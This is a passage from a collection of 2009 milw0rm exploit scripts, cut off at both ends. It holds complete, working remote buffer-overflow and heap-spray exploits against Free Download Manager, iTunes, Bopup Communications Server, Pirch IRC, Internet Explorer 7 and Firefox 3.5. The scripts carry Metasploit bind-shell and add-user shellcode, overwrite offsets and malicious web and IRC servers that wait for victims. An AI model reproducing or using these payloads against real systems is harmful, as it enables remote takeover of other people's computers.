"\x42\x45\x4a\x56\x42\x4f\x4c\x48\x46\x30\x4f\x55\x4a\x56\x4a\x49"
"\x50\x4f\x4c\x38\x50\x50\x47\x55\x4f\x4f\x47\x4e\x43\x36\x41\x46"
"\x4e\x46\x43\x56\x42\x50\x5a")

payload  = "\x41" * (3084-len(shellcode))
payload += shellcode
payload += "\xE9\xA4\xFE\xFF\xFF"
payload += "\90"*22
payload += "\xEB\xE3\x41\x42"
payload += "\x34\x14\x40\x00" # p/p/r->SoulSeek.exe
payload += "\x44" * 1423


request2 = "\x01\x0f\x00\x00\x2a\x00\x00\x00\x09\x00\x00\x00"
request2 += "testt4321"
request2 += "\xa4\x5a\x51\x44\xe8\x0e\x00\x00"
request2 += payload

s.send(request2)
sleep(1)
s.recv(1024)

# milw0rm.com [2009-05-26]
#!/usr/bin/python
#[*] Usage   : fdm.py [victime_ip]
#[*] Bug     : Free Download Manager 2.5/3.0 (Control Server) Remote BOF Exploit
#[*] Fix     : update
#[*] Founder : Praveen Darshanam   
#[*] Tested on :    Xp sp3 (en)
#[*] Exploited by : His0k4
#[*] Greetings :    All friends & muslims HaCkErs (DZ)

import sys, socket
import base64
from time import *

host = sys.argv[1] 
port = 80

# win32_exec -  EXITFUNC=seh CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com
shellcode=(
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x34"
"\x42\x30\x42\x50\x42\x30\x4b\x58\x45\x54\x4e\x33\x4b\x58\x4e\x57"
"\x45\x30\x4a\x37\x41\x30\x4f\x4e\x4b\x58\x4f\x34\x4a\x31\x4b\x48"
"\x4f\x35\x42\x52\x41\x50\x4b\x4e\x49\x54\x4b\x38\x46\x53\x4b\x38"
"\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x59\x4e\x4a\x46\x58\x42\x4c"
"\x46\x57\x47\x30\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x53\x46\x55\x46\x32\x46\x30\x45\x37\x45\x4e\x4b\x38"
"\x4f\x55\x46\x42\x41\x50\x4b\x4e\x48\x36\x4b\x38\x4e\x50\x4b\x44"
"\x4b\x48\x4f\x35\x4e\x51\x41\x30\x4b\x4e\x4b\x58\x4e\x41\x4b\x48"
"\x41\x30\x4b\x4e\x49\x38\x4e\x55\x46\x52\x46\x50\x43\x4c\x41\x33"
"\x42\x4c\x46\x56\x4b\x48\x42\x44\x42\x43\x45\x58\x42\x4c\x4a\x37"
"\x4e\x50\x4b\x38\x42\x44\x4e\x50\x4b\x38\x42\x37\x4e\x31\x4d\x4a"
"\x4b\x58\x4a\x56\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x38\x42\x4b"
"\x42\x50\x42\x30\x42\x50\x4b\x48\x4a\x56\x4e\x43\x4f\x45\x41\x43"
"\x48\x4f\x42\x56\x48\x35\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x37"
"\x42\x55\x4a\x46\x42\x4f\x4c\x38\x46\x50\x4f\x55\x4a\x56\x4a\x49"
"\x50\x4f\x4c\x58\x50\x50\x47\x35\x4f\x4f\x47\x4e\x43\x56\x41\x56"
"\x4e\x46\x43\x46\x42\x50\x5a")

exploit = "3-1 "# a trick & a memory ;)
exploit += shellcode
exploit += "\x41"*(1003-len(shellcode))
exploit += "\xE8\x10\xFC\xFF\xFF"
exploit += "\x93\xB1\x40\x00" #jmp esp fdmwi
exploit += "\x90"*4
exploit += "\x73\xF1\x42\x42"

auth = base64.b64encode(exploit)


head =  'GET '+shellcode+' HTTP/1.1\r\n'
head += 'Host: '+sys.argv[1]+'\r\n'
head += 'Authorization: Basic '+auth+'\r\n\r\n'


i=0
#3a9liya MIAS xD
while i<=2:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	s.send(head)
	i=i+1

# milw0rm.com [2009-06-09]
#!/usr/bin/python
# Apple iTunes 8.1.1.10 itms/itcp BOF Windows Exploit
# www.offensive-security.com/blog/vulndev/itunes-exploitation-case-study/
# Matteo Memelli | ryujin __A-T__ offensive-security.com
# Spaghetti & Pwnsauce - 06/10/2009 
# CVE-2009-0950 http://dvlabs.tippingpoint.com/advisory/TPTI-09-03
#
# Vulnerability can't be exploited simply overwriting a return address on the
# stack because of stack  canary protection. Increasing buffer  size leads to
# SEH overwrite but it seems that the Access Violation needed to get  our own
# Exception Handler called is not always thrown.
# So, to increase reliability, the exploit sends two URI to iTunes:
# - the 1st payload corrupts the stack (it doesnt overwrite cookie, no crash)
# - the 2nd payload fully overwrite SEH to 0wN EIP
# Payloads must be encoded in order to obtain pure ASCII printable shellcode.
# I could trigger the  vulnerability from  Firefox but not from IE that seems
# to truncate the long URI.
# Tested on Windows XP SP2/SP3 English, Firefox 3.0.10, 
# iTunes 8.1.1.10, 8.1.0.52
#
# --> hola hola ziplock, my Apple Guru! ;) && cheers to muts... he knows why
#
# ryujin:Desktop ryujin$ ./ipwn.py 
# [+] iTunes 8.1.10 URI Bof Exploit Windows Version CVE-2009-0950
# [+] Matteo Memelli aka ryujin __A-T__ offensive-security.com
# [+] www.offensive-security.com
# [+] Spaghetti & Pwnsauce
# [+] Listening on port 80
# [+] Connection accepted from: 172.16.30.7
# [+] Payload sent, wait 20 secs for iTunes error!
# ryujin:Desktop ryujin$ nc -v 172.16.30.7 4444
# Connection to 172.16.30.7 4444 port [tcp/krb524] succeeded!
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
# 
# C:\Program Files\Mozilla Firefox> 

from socket import *

html = """
<html>
  <head><title>iTunes loading . . .</title>
  <script>
   function openiTunes(){document.location.assign("itms://itunes.apple.com/");}
   function prepareStack(){document.location.assign("%s");}
   function ownSeh(){document.location.assign("%s");}
   function ipwn(){
    prepareStack();
    ownSeh();
   }
   function main() {
    openiTunes();
    // Increase this timeout if your iTunes takes more time to load!
    setTimeout('ipwn()',20000);
   }
  </script>
  </head>
  <body onload="main();">
    <p align="center">
    <b>iTunes 8.1.1.10 URI Bof Exploit Windows Version CVE-2009-0950</b>
    </p>
    <p align="center"><b>ryujin __ A-T __ offensive-security.com</b></p>
    <p align="center"><b>www.offensive-security.com</b></p>
    <p align="center">
    iTunes starting... wait for 20 secs; if you get an error, click "Ok"
    in the MessageBox before checking for your shell on port 4444 :)<br/>
    If victim host is not connected to the internet, exploit will fail
    unless iTunes is already opened and you disable "openiTunes" javascript
    function.
    <br/>
    <h2 align="center">
    <b><u>This exploit works if opened from Firefox not from IE!</u></b>
    </h2>
    <p align="center">
    After exploitation iTunes crashes, you need to kill it from TaskManager
    <br/>have fun!</br>
    </p>
    </p>
  </body>
</html>"""

# Alpha2 ASCII  printable  Shellcode  730 Bytes, via  EDX (0x60,0x40 Badchar)
# This is not standard Alpha2 bind shell. Beginning of shellcode  is modified
# in order to obtain register alignment and to  reset ESP and EBP we  mangled
# before. Rest of decoded shellcode is Metasploit  bind  shell  on  port 4444
# EXITFUNC=thread
# 
shellcode = ("VVVVVVVVVVVVVVVVV7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIOqhDahIoS0"
             "5QnaJLS1uQVaeQcdcm2ePESuW5susuPEsuilazJKRmixHykOkOKOCPLKPlUtu"
             "tnkRegLLKSLfepx31zOlK2o7hlKqOEpWqZK3ylKwDLKeQHndqo0j9llOt9P3D"
             "uW9Q8J4MWqkrJKkDukPTWTq845M5LKQOq4VajKcVLKTLPKlKQOUL6ajK336LL"
             "KMY0lWTwle1O3TqiK2DLKaSFPLKQPVllK0p7lLmlK3pUXQNU8LNbnvnjL0PkO"
             "8V2Fv3U61xds02U8RWpsVRqO649on0PhjkZMYlekpPKOKfsoMYkUpfna8mgxV"
             "b65RJuRIoHPPhHYFiL5lmBwkOzvpSPSV3F3bsg3BsSsScIohPsVRHR1sl2Fcc"
             "k9M1nuphOT6zppIWrwKO8VcZ6ppQv5KO8PBHmtNMvNm9QGKON6aCqEkOZpbHZ"
             "EbiNfRiSgioiFRpf40TseiohPLSu8KWD9kvPyf7YoxVqEKOxPu6sZpd3VSX1s"
             "0mK98ecZRpv9Q9ZlMYkWqzpDmYxbTqO0KCoZKNaRVMkN3r6LJ3NmpzFXNKNKL"
             "ksX0rkNls5FkOrURdioXVSk67PRPQsapQCZgqbq0QSesaKOxPaxNMZyEUjnCc"
             "KOn6qzKOkOtwKOJpNk67YlMSKtcTyozvrryozp0hXoZnYp1p0SkOXVKOHPA")
# Padding
pad0x1          = "\x41"*425

# Make EDX pointing to shellcode and "pray" sh3llcod3 M@cumBa w00t w00t
align           = "\x61"*45 + "\x54\x5A" + "\x42"*6 + "V"*10

# Padding
pad0x2          = "\x41"*570                                   

# ASCII friendly RET overwriting SEH: bye bye canary, tweet tweet
# 0x67215e2a QuickTime.qts ADD ESP,8;RETN (SafeSEH bypass)
ret             = "\x2a\x5e\x21\x67"

# Let the dance begin... Point EBP to encoded jmp                                                               
align_for_jmp   = "\x61\x45\x45\x45" + ret + "\x44" + "\x45"*7

# Decode a NEAR JMP and JUMP BACK BABY!
jmp_back        = ("UYCCCCCCIIIIIIIIII7QZjAXP0A0AkA"
                   "AQ2AB2BB0BBABXP8ABuJIZIE5jZKOKOA")
# Padding
pad0x3          = "\x43"*162                                   

# We send 2 payloads to iTunes: first is itms and second itpc
# url1 smashes the stack in order to get an AV later
url1            = "itms://:" + "\x41"*200 + "/" 
url2            = "itpc://:" + pad0x1 + align + shellcode +pad0x2 +\
                               align_for_jmp + jmp_back + pad0x3 
payload         = html % (url1, url2)

print "[+] iTunes 8.1.1.10 URI Bof Exploit Windows Version CVE-2009-0950"
print "[+] Matteo Memelli aka ryujin __A-T__ offensive-security.com"
print "[+] www.offensive-security.com"
print "[+] Spaghetti & Pwnsauce"
s = socket(AF_INET, SOCK_STREAM)
s.bind(("0.0.0.0", 80))
s.listen(1)
print "[+] Listening on port 80"
c, addr = s.accept()
print "[+] Connection accepted from: %s" % (addr[0])
c.recv(1024)
c.send(payload)
print "[+] Payload sent, wait 20 secs for iTunes error!"
c.close()
s.close()

# milw0rm.com [2009-06-12]
#!/usr/bin/python
#[*] Usage : python bopup.py [target_ip]
# _  _   _         __    _     _ _  
#| || | (_)  ___  /  \  | |__ | | | 
#| __ | | | (_-< | () | | / / |_  _|
#|_||_| |_| /__/  \__/  |_\_\   |_| 
#
#[*] Bug     : Bopup Communications Server (3.2.26.5460) Remote BOF Exploit (SEH)
#[*] Tested on :    Xp sp3 (EN)(VB)
#[*] Refer	:	mu-b
#[*] Exploited by : His0k4
#[*] Greetings :    All friends & muslims HaCkErs (DZ)


import socket,sys,struct
from time import *

host = sys.argv[1]

def banner():
        print "\n[x] Bopup Communications Server Remote BOF Exploit (SEH)\n"
        print "[x] By: His0k4\n"
 
if len(sys.argv)!=2:
        banner()
        print "Usage: %s <ip>" %sys.argv[0]
        sys.exit(0)

# win32_adduser -  PASS=27 EXITFUNC=seh USER=dz Size=228 Encoder=PexFnstenvSub http://metasploit.com
shellcode=(
"\x44\x7A\x32\x37\x44\x7A\x32\x37\x29\xc9\x83\xe9\xcd\xd9\xee\xd9"
"\x74\x24\xf4\x5b\x81\x73\x13\x05\x16\xf2\x06\x83\xeb\xfc\xe2\xf4"
"\xf9\xfe\xb6\x06\x05\x16\x79\x43\x39\x9d\x8e\x03\x7d\x17\x1d\x8d"
"\x4a\x0e\x79\x59\x25\x17\x19\x4f\x8e\x22\x79\x07\xeb\x27\x32\x9f"
"\xa9\x92\x32\x72\x02\xd7\x38\x0b\x04\xd4\x19\xf2\x3e\x42\xd6\x02"
"\x70\xf3\x79\x59\x21\x17\x19\x60\x8e\x1a\xb9\x8d\x5a\x0a\xf3\xed"
"\x8e\x0a\x79\x07\xee\x9f\xae\x22\x01\xd5\xc3\xc6\x61\x9d\xb2\x36"
"\x80\xd6\x8a\x0a\x8e\x56\xfe\x8d\x75\x0a\x5f\x8d\x6d\x1e\x19\x0f"
"\x8e\x96\x42\x06\x05\x16\x79\x6e\x39\x49\xc3\xf0\x65\x40\x7b\xfe"
"\x86\xd6\x89\x56\x6d\xe6\x78\x02\x5a\x7e\x6a\xf8\x8f\x18\xa5\xf9"
"\xe2\x75\x9f\x62\x2b\x73\x8a\x63\x25\x39\x91\x26\x6b\x73\x86\x26"
"\x70\x65\x97\x74\x25\x72\x88\x26\x37\x21\xd2\x29\x44\x52\xb6\x26"
"\x23\x30\xd2\x68\x60\x62\xd2\x6a\x6a\x75\x93\x6a\x62\x64\x9d\x73"
"\x75\x36\xb3\x62\x68\x7f\x9c\x6f\x76\x62\x80\x67\x71\x79\x80\x75"
"\x25\x72\x88\x26\x2a\x57\xb6\x42\x05\x16\xf2\x06")


payload = '\x01\x00\x00\x00'
payload += '\x41'*(821-len(shellcode))
payload += shellcode
payload += '\x42'*27	#padding
payload += '\xE8\xFC\xFE\xFF\xFF' #Call back
payload += '\x43'*8	#padding, escaping from the \x00 monster :p
payload += '\xEB\xF1\xFF\xFF' #short jump
payload += '\xE0\x14\x40\x00' #p/p/r bcssrvc (universal)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	s.connect((host,19810))
except:
	print "Can\'t connect to server!\n"
	sys.exit(0)

s.send(payload+'\r\n')
print("[+] Done!")
s.close()

# milw0rm.com [2009-06-29]
#!/usr/bin/env python
######################################################################################
# MS Internet Explorer 7 DirectShow (msvidctl.dll) Heap Spray  (Advisory 972890)     #				 		 				 				    
######################################################################################
#									             #
# Written by SecureState R&D Team 	                                             #
# Authors: David Kennedy (ReL1K), John Melvin (Whipsmack), Steve Austin              #
# http://www.securestate.com				 		             #
#									             #
# win32_bind EXITFUNC=seh LPORT=5500 Size=314 Encoder=ShikataGaNai Shell=bind        #
#									             #
######################################################################################
# Tested on WinXPSP3, Win2k3SP2, WinXPSP2 on IE6 and IE7                             # 
######################################################################################
#										     #
# This exploit is publicly being exploited in the wild, opted to release this	     #
# to the research community. Microsoft is aware of the vulnerability.		     #
#										     #
######################################################################################
#										     #
# [-] Exploit sent... [-]							     #
# [-] Wait about 30 seconds and attempt to connect.[-]				     #
# [-] Connect to IP Address: 10.211.55.140 and port 5500 [-]		             #
#										     #
# relik@sslinuxvm1:~$ telnet 10.211.55.140 5500					     #
# Trying 10.211.55.140...							     #
# Connected to 10.211.55.140.							     #
# Escape character is '^]'.							     #
# Microsoft Windows [Version 5.2.3790]						     #
# (C) Copyright 1985-2003 Microsoft Corp.					     #
#									             #
# C:\Documents and Settings\Administrator\Desktop>				     #
#										     #
#										     #
# NOTE: The javascript code is not obfuscated in anyway, normal A/V should pick this #
# up. This is intentional.							     #
#										     #
# Improved reliability, appears to be about 95 percent of the time. Adjusted the     #
# spray size a bit.								     #
#										     #
######################################################################################
from BaseHTTPServer import HTTPServer
from BaseHTTPServer import BaseHTTPRequestHandler
import sys,binascii
try:
  import psyco
  psyco.full()
except ImportError:
   pass
class myRequestHandler(BaseHTTPRequestHandler):
 try:
  def do_GET(self):
    # Always Accept GET
    self.printCustomHTTPResponse(200)
    # trigger the overflow *boom*
    if self.path == "/ohn0es.jpg":
       unhex=binascii.unhexlify("000300001120340000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffff0c0c0c0c00")
       self.wfile.write(unhex)
    if self.path == "/":
        target=self.client_address[0]
        self.wfile.write("""<html><head>""")
        self.wfile.write("""
        <script language="JavaScript" defer>
        function Check() {
        //  win32_bind -  EXITFUNC=seh LPORT=5500 Size=314 Encoder=ShikataGaNai http://metasploit.com */
        var shellcode = unescape("%ud9db%u74d9%uf424%uc929%u51b1%u02bf%u6c21%u588e%u7831%u8317%u04c0%u7a03%u8e32%u867b%ua55e%u9ec9%uc666%ua12d%ub2f9%u79be%u4fde%ubd7b%u2c95%uc581%u23a8%u7a02%u30b3%ua44a%uadc2%u2f3c%ubaf0%uc1be%u7cc8%ub159%ubdaf%uce2e%uf76e%ud1c2%ue3b2%uea29%ud066%u79f9%u9362%ua5a5%u4f6d%u2e3f%uc461%u6f4b%udb66%u8ca0%u50ba%ufebf%u7ae6%u3da1%u59d7%u4a45%u6e5b%u0c0d%u0550%u9061%u92c5%ua0c2%ucd4b%ufe4c%ue17d%u0101%u9f57%u9bf2%u5330%u0bc7%ue0b6%u9415%uf86c%u428a%ueb46%ua9d7%u0b08%u92f1%u1621%uad98%ud1df%uf867%ue075%ud298%u3de2%u276f%uea5f%u118f%u46f3%uce23%u2ba7%ub390%u5314%u55c6%ubef3%uff9b%u4850%u6a82%uee3e%ue45f%ub978%ud2a0%u56ed%u8f0e%u860e%u8bd8%u095c%u84f0%u8061%u7f51%ufd61%u9a3e%u78d4%u33f7%u5218%uef58%u0eb2%udfa6%ud9a8%ua6bf%u6008%ua717%uc643%u8768%u830a%u41f2%u30bb%u0496%uddde%u4f38%uee08%u8830%uaa20%ub4cb%uf284%u923f%ub019%u1c92%u19a7%u6d7e%u5a52%uc62b%uf208%ue659%u15fc%u6361%ue547%ud04b%u4b10%ub725%u01cf%u66c4%u80a1%u7797%u4391%u5eb5%u5a17%u9f96%u08ce%ua0e6%u33d8%ud5c8%u3070%u2d6a%u371a%uffbb%u171c%u0f2c%u9c68%ubcf2%u4b92%u92f3");
        var bigblock = unescape("%u9090%u9090");
	var headersize = 20;
	var slackspace = headersize + shellcode.length;
	while (bigblock.length < slackspace) bigblock += bigblock;
	var fillblock = bigblock.substring(0,slackspace);
	var block = bigblock.substring(0,bigblock.length - slackspace);
        // Original spray size below, use if you want exploit to load faster with higher crash rate.
        // while (block.length + slackspace < 0x40000) block = block + block + fillblock;
	while (block.length + slackspace < 0x70000) block = block + block + fillblock;
	var memory = new Array();
	for (i = 0; i < 350; i++){ memory[i] = block + shellcode}
	var myObject=document.createElement('object');
	DivID.appendChild(myObject);
	myObject.width='1';
	myObject.height='1';
	myObject.data='./ohn0es.jpg';
	// Vulnerable ID
	myObject.classid='clsid:0955AC62-BF2E-4CBA-A2B9-A63F772D46CF';		
	} 
        </script>
        </head>
        <body onload="Check();">
        <div id="DivID">""")
        self.wfile.write("""<title>MS Internet Explorer 7 DirectShow (msvidctl.dll) Heap Spray (Advisory 972890)</title></head><body>""")
        self.wfile.write("""<left><body bgcolor="Black"><font color="White">
                ###############################################################################
		<br>MS Internet Explorer 7 DirectShow (msvidctl.dll) Heap Spray  (Advisory 972890)     
		<br>Written by SecureState R&D Team                                                    
		<br>Authors: David Kennedy (ReL1K), John Melvin (Whipsmack), Steve Austin              
		<br>http://www.securestate.com                                                         
		<br>win32_bind EXITFUNC=seh LPORT=5500 Size=314 Encoder=ShikataGaNai Shell=bind        
		<br>Tested on WinXPSP3, Win2k3SP2, WinXPSP2 on IE6 and IE7                            
                <br>###############################################################################<br> 
        	<br>""")
        print ("\n\n[-] Exploit sent... [-]\n[-] Wait about 30 seconds and attempt to connect.[-]\n[-] Connect to IP Address: %s and port 5500 [-]" % (target))
  # Print custom HTTP Response
  def printCustomHTTPResponse(self, respcode):
    self.send_response(respcode)
    self.send_header("Content-type", "text/html")
    self.send_header("Server", "myRequestHandler")
    self.end_headers()

 # In case of exceptions, pass them
 except Exception:
    pass

httpd = HTTPServer(('', 80), myRequestHandler)
print ("""
#####################################################################################
# MS Internet Explorer 7 DirectShow (msvidctl.dll) Heap Spray  (Advisory 972890)    #
#####################################################################################
#                                                                                   #
# Written by SecureState R&D Team                                                   #
# Authors: David Kennedy (ReL1K), John Melvin (Whipsmack), Steve Austin             #
# http://www.securestate.com                                                        #
#                                                                                   #
# win32_bind EXITFUNC=seh LPORT=5500 Size=314 Encoder=ShikataGaNai Shell=bind       #
#                                                                                   #
#####################################################################################
#        Tested on WinXPSP3, Win2k3SP2, WinXPSP2 on IE6 and IE7                     #
#####################################################################################
""")
print ("[-] Starting MS Internet Explorer 7 DirectShow (msvidctl.dll) Heap Spray [-]")
print ("[-] Have someone connect to you on port 80 [-]")
print ("\n\nType <control>-c to exit..")
try:
     # handle the connections
     httpd.handle_request()
     # Serve HTTP server forever
     httpd.serve_forever() 
# Except Keyboard Interrupts and throw custom message
except KeyboardInterrupt:
       print ("\n\nExiting exploit...\n\n")
       sys.exit(1)

# milw0rm.com [2009-07-10]
#!/usr/bin/python
#[*] Usage : python pirch.py
# _  _   _         __    _     _ _  
#| || | (_)  ___  /  \  | |__ | | | 
#| __ | | | (_-< | () | | / / |_  _|
#|_||_| |_| /__/  \__/  |_\_\   |_| 
#
#[*] Bug     :      Pirch IRC 98 Client (response) Remote BOF Exploit (SEH)
#[*] Tested on :    Xp sp3 (EN)(VB)
#[*] Ref	:   Bid 5079
#[*] Exploited by : His0k4
#[*] Greetings :    All friends (DZ)


from socket import *

# win32_exec -  EXITFUNC=seh CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com
shellcode=(
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54"
"\x42\x30\x42\x50\x42\x30\x4b\x38\x45\x34\x4e\x43\x4b\x58\x4e\x47"
"\x45\x50\x4a\x37\x41\x50\x4f\x4e\x4b\x58\x4f\x34\x4a\x41\x4b\x58"
"\x4f\x55\x42\x52\x41\x50\x4b\x4e\x49\x44\x4b\x38\x46\x33\x4b\x48"
"\x41\x50\x50\x4e\x41\x43\x42\x4c\x49\x59\x4e\x4a\x46\x58\x42\x4c"
"\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x33\x46\x55\x46\x52\x46\x50\x45\x47\x45\x4e\x4b\x48"
"\x4f\x55\x46\x52\x41\x30\x4b\x4e\x48\x56\x4b\x48\x4e\x30\x4b\x34"
"\x4b\x48\x4f\x35\x4e\x51\x41\x50\x4b\x4e\x4b\x58\x4e\x51\x4b\x58"
"\x41\x50\x4b\x4e\x49\x48\x4e\x55\x46\x42\x46\x50\x43\x4c\x41\x43"
"\x42\x4c\x46\x36\x4b\x38\x42\x54\x42\x33\x45\x38\x42\x4c\x4a\x47"
"\x4e\x30\x4b\x48\x42\x34\x4e\x50\x4b\x58\x42\x57\x4e\x51\x4d\x4a"
"\x4b\x48\x4a\x36\x4a\x50\x4b\x4e\x49\x50\x4b\x48\x42\x38\x42\x4b"
"\x42\x30\x42\x50\x42\x30\x4b\x58\x4a\x56\x4e\x43\x4f\x35\x41\x33"
"\x48\x4f\x42\x46\x48\x55\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x57"
"\x42\x45\x4a\x46\x42\x4f\x4c\x58\x46\x30\x4f\x35\x4a\x46\x4a\x59"
"\x50\x4f\x4c\x58\x50\x50\x47\x45\x4f\x4f\x47\x4e\x43\x36\x41\x56"
"\x4e\x36\x43\x56\x42\x30\x5a")

payload =  "DZ" #Trick track
payload += shellcode
payload += "\x41"*(1035-len(shellcode))
payload += "\xE8\xF0\xFB\xFF\xFF" # back again
payload += "\x42"*5
payload += "\xEB\xF4\xFF\xFF" # back
payload += "\x9A\x2B\x40\x0A" # lucky x0A=>x00  ;)   univ p/p/r


head =  ":irc.localhost 001 attacker :Welcome to the Internet Relay Chat network, attacker!pirch@0.0.0.0\r\n"
head += ":attacker_test!pirch@0.0.0.gl08= MODE "+payload+" :-i\r\n"


s = socket(AF_INET, SOCK_STREAM)
s.bind(("0.0.0.0", 6667))
s.listen(1)

print "[*] Listening on [IRC] 6667"
c, addr = s.accept()
print "[*] Connection accepted from: %s" % (addr[0])
c.recv(1024)
c.send(head)

raw_input("[*] Payload sended!\nPress key to exit")
c.close()
s.close()

# milw0rm.com [2009-07-12]
#!/usr/bin/env python
#######################################################
#
# FireFox 3.5 Heap Spray Exploit
# Originally discovered by: Simon Berry-Bryne
# Pythonized by: David Kennedy (ReL1K) @ SecureState
#
#######################################################
from BaseHTTPServer import HTTPServer 
from BaseHTTPServer import BaseHTTPRequestHandler 
import sys 

class myRequestHandler(BaseHTTPRequestHandler):

  def do_GET(self):
    self.printCustomHTTPResponse(200)
    if self.path == "/":
        target=self.client_address[0]
        self.wfile.write("""
<html>
<head>
<title>Firefox 3.5 Vulnerability</title>
Firefox 3.5 Heap Spray Exploit
</br>
Discovered by: SBerry aka Simon Berry-Byrne
Pythonized: David Kennedy (ReL1K) at SecureState
Bind Shell Port: 5500
Encoding: Shikata_Ga_Nai
</br>
<div id="content">
<p>
<FONT>                             
</FONT>
</p>
<p>
<FONT>Ihazacrashihazacrash</FONT></p>
<p>
<FONT>Ohnoesihazacrashhazcrash</FONT>
</p>
<p>
<FONT>Aaaaahhhhh  </FONT>
</p>
</div>
<script language=JavaScript>

// windows/shell_bind_tcp - 317 bytes http://www.metasploit.com LPORT=5500 encoding=shikata_ga_nai
var shellcode= unescape("%u6afc%u4deb%uf9e8%uffff%u60ff%u6c8b%u2424%u458b%u8b3c%u057c%u0178%u8bef" +
			"%u184f%u5f8b%u0120%u49eb%u348b%u018b%u31ee%u99c0%u84ac%u74c0%uc107%u0dca" +
			"%uc201%uf4eb%u543b%u2824%ue575%u5f8b%u0124%u66eb%u0c8b%u8b4b%u1c5f%ueb01" +
			"%u2c03%u898b%u246c%u611c%u31c3%u64db%u438b%u8b30%u0c40%u708b%uad1c%u408b" +
			"%u5e08%u8e68%u0e4e%u50ec%ud6ff%u5366%u6866%u3233%u7768%u3273%u545f%ud0ff" +
			"%ucb68%ufced%u503b%ud6ff%u895f%u66e5%ued81%u0208%u6a55%uff02%u68d0%u09d9" +
			"%uadf5%uff57%u53d6%u5353%u5353%u5343%u5343%ud0ff%u6866%u7c15%u5366%ue189" +
			"%u6895%u1aa4%uc770%uff57%u6ad6%u5110%uff55%u68d0%uada4%ue92e%uff57%u53d6" +
			"%uff55%u68d0%u49e5%u4986%uff57%u50d6%u5454%uff55%u93d0%ue768%uc679%u5779" +
			"%ud6ff%uff55%u66d0%u646a%u6866%u6d63%ue589%u506a%u2959%u89cc%u6ae7%u8944" +
			"%u31e2%uf3c0%ufeaa%u2d42%u42fe%u932c%u7a8d%uab38%uabab%u7268%ub3fe%uff16" +
			"%u4475%ud6ff%u575b%u5152%u5151%u016a%u5151%u5155%ud0ff%uad68%u05d9%u53ce" +
			"%ud6ff%uff6a%u37ff%ud0ff%u578b%u83fc%u64c4%ud6ff%uff52%u68d0%uceef%u60e0" +
			"%uff53%uffd6%u41d0");
oneblock = unescape("%u0c0c%u0c0c");
var fullblock = oneblock;
while (fullblock.length<0x60000)  
{
    fullblock += fullblock;
}
sprayContainer = new Array();
for (i=0; i<600; i++)  
{
    sprayContainer[i] = fullblock + shellcode;
}
var searchArray = new Array()
 
function escapeData(data)
{
 var i;
 var c;
 var escData='';
 for(i=0;i<data.length;i++)
  {
   c=data.charAt(i);
   if(c=='&' || c=='?' || c=='=' || c=='%' || c==' ') c = escape(c);
   escData+=c;
  }
 return escData;
}
function DataTranslator(){
    searchArray = new Array();
    searchArray[0] = new Array();
    searchArray[0]["str"] = "blah";
    var newElement = document.getElementById("content")
    if (document.getElementsByTagName) {
        var i=0;
        pTags = newElement.getElementsByTagName("p")
        if (pTags.length > 0)  
        while (i<pTags.length)
        {
            oTags = pTags[i].getElementsByTagName("font")
            searchArray[i+1] = new Array()
            if (oTags[0])  
            {
                searchArray[i+1]["str"] = oTags[0].innerHTML;
            }
            i++
        }
    }
}
 
function GenerateHTML()
{
    var html = "";
    for (i=1;i<searchArray.length;i++)
    {
        html += escapeData(searchArray[i]["str"])
    }    
}
DataTranslator();
GenerateHTML()
</script>
</body>
</html>""")
        print ("\n\n[-] Exploit sent... [-]\n[-] Wait about 30 seconds and attempt to connect.[-]\n[-] Connect to IP Address: %s and port 5500 [-]" % (target))

  def printCustomHTTPResponse(self, respcode):
    self.send_response(respcode)
    self.send_header("Content-type", "text/html")
    self.send_header("Server", "myRequestHandler")
    self.end_headers()

httpd = HTTPServer(('', 80), myRequestHandler)

print ("""
#######################################################
#
# FireFox 3.5 Heap Spray
# Originally discovered by: Simon Berry-Bryne
# Pythonized: David Kennedy (ReL1K) @ SecureState
#
#######################################################
""")
print ("Listening on port 80.")
print ("Have someone connect to you.")
print ("\nType <control>-c to exit..")
try:
     httpd.handle_request()
     httpd.serve_forever() 
except KeyboardInterrupt:
       print ("\n\nExiting exploit...\n\n")
       sys.exit(1)

# milw0rm.com [2009-07-17]
#
#   Author : Ahmed Obied (ahmed.obied@gmail.com)
#   
#   - Based on the code posted at http://www.milw0rm.com/exploits/9163
#   - Tested using:
#     > Internet Explorer 7.0.5730.13 on Windows XP SP3 with owc10.dll installed
#     > Internet Explorer 7.0.5730.13 on Windows XP SP3 with owc11.dll installed
#
#   Usage  : python ie_owc.py [port (between 1024 and 65535)]
#   

import sys
import socket

from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
        
class RequestHandler(BaseHTTPRequestHandler):

    def convert_to_utf16(self, payload):
